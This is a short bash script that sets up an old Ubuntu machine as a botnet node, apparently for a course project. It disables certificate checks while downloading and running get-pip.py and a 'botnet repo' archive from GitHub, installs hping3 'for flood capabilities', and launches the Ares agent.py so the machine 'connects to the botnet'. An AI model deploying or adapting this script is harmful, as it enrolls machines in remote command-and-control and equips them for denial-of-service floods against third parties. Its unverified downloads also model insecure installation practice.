#! /bin/bash

# Back up existing file
sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak

# Add old repositories for software updates
echo "deb http://old-releases.ubuntu.com/ubuntu/ hardy main restricted universe multiverse" >> /etc/apt/sources.list
echo "deb http://old-releases.ubuntu.com/ubuntu/ hardy-updates main restricted universe multiverse" >> /etc/apt/sources.list
echo "deb http://old-releases.ubuntu.com/ubuntu/ hardy-security main restricted universe multiverse" >> /etc/apt/sources.list
echo "deb http://ppa.launchpad.net/python-dev/ppa/ubuntu hardy main" >> /etc/apt/sources.list

# Update repository listing and install base packages
sudo apt-get update
sudo apt-get install git git-core python2.6 -y

# Install pip for Python 2.6
wget https://bootstrap.pypa.io/get-pip.py --no-check-certificate && sudo python2.6 get-pip.py

# Install Python Requests library
sudo pip install --upgrade pip
sudo pip install requests

# Clone the botnet repo
cd ~ && wget https://github.com/kmanwar89/460SP/archive/master.zip --no-check-certificate
mv master master.zip && unzip master.zip

# Download hping for flood capabilities
sudo apt-get install hping3 -y

# Connect to the  botnet!
cd 460SP-master/Ares/agent/python && python2.6 agent.py
